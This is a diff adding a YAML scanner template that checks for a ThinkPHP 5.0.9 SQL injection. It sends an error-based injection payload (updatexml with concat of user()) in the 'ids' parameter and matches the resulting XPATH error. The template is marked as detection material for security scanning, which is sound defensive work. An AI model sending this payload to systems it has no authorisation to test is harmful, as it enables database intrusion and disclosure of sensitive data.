@@ -1,0 +1,24 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: word
+        part: body
+        words:
+          - XPATH syntax error
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
+id: thinkphp-509-sqli
+info:
+  author: dr_set
+  description: Verbose SQL error message reveals sensitive information including database credentials.
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: ThinkPHP 5.0.9 SQL Injection
+  severity: high
+  tags: thinkphp,disclosure,argus-import
